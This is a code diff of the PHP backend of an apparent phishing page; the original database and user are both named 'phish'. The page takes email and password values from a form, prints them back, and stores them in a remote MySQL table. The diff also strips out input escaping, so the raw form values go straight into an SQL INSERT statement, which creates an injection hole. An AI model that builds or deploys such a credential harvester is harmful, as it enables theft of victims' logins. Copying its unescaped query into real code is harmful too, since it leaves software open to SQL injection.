@@ -6,10 +6,13 @@
 </head>
 <body>
 <?php
-$servername = "127.0.0.1";
-$username = "phish";
+$servername = "172.31.2.233:8889";
+$username = "userx";
 $password = "123";
-$dbname = "phish";
+$dbname = "userx";
+$emailtest = $_POST["email"];
+$pass1 = $_POST["pass1"];
+echo var_dump($emailtest)."<br>".var_dump($pass1)."<br>";
 
 // Create connection
 $conn = new mysqli($servername, $username, $password, $dbname);
@@ -30,15 +33,11 @@ if ($conn->connect_error) {
 //   echo "没有收到POST请求";
 // }
 if(isset($_POST['email'])&& isset($_POST['pass1'] )){
-    $YourName = $conn->real_escape_string($_POST['email']);
-    $YourPass = $conn->real_escape_string($_POST['pass1']);
-
-    $sql = "INSERT INTO account (`id`,`usrname`,`password`)
-            VALUES (2,'$YourName', '$YourPass')";
+  $sql = "INSERT INTO account (`id`,`email`,`password`) VALUES (2,'$emailtest', '$pass1')";
   if ($conn->query($sql) === TRUE) {
-    // echo "Record inserted successfully";
+    echo "Record inserted successfully";
   } else {
-    // echo "Error: " . $conn->error;
+    echo "Error: " . $conn->error;
   }
 }
 else{
